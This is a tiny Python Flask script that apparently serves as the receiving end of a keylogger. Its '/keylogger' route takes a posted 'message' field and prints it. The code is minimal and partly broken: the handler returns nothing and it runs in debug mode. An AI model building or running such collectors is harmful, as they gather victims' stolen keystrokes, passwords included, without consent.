import logging
import json
from flask import Flask, request


app = Flask(__name__)

@app.route('/keylogger', methods=['POST', 'GET'])
def log():
    message = request.form['message']
    print(message)

app.run(debug=True)
